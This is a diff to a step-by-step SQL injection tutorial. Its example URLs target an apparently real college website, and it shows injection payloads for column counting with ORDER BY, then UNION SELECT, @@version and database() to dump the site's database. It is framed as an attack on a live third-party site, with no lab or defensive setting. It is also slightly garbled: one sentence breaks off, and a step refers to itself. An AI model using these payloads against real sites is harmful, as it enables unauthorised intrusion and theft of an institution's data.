@@ -33,3 +33,32 @@ Example: https://www.hicas.ac.in/pg-course?link=999999999999
 Special Characters
 Try symbols like ', ", #, %, &, *, -, and +.
 Example: https://www.hicas.ac.in/pg-course?link=mca'"
+
+If you see an error like:
+
+## STEP 3 - Eliminate the Error to Balance the Query
+Use spacing and comment indicators like --+ to balance the query structure effectively.
+
+## STEP 4 - Inject SQL Code
+
+Insert SQL commands in the space created in Step 4. Start by using ORDER BY to determine the number of columns in the database:
+
+Example: https://www.hicas.ac.in/pg-course?link=mca' order by 31--+
+If this produces an error such as Unknown column '31' in 'order clause', reduce the number and test again.
+
+Example: https://www.hicas.ac.in/pg-course?link=mca' order by 30--+
+Once you no longer receive an error, you’ll have identified the number of columns—here, 30.
+
+## STEP 5 - Identify Vulnerable Columns with UNION SELECT
+
+To locate vulnerable columns among the 30, use UNION ALL SELECT. The result may indicate specific vulnerable columns, such as columns 5, 10, 11, 12, and 13.
+
+## STEP 6 - Dump the Entire Database Using Vulnerable Columns
+
+With the identified vulnerable columns, you can now retrieve data. For instance, retrieve the database version with @@version.
+
+## STEP 7 - Dump the Current Database Name
+
+To obtain the name of the current database, use database().
+
+
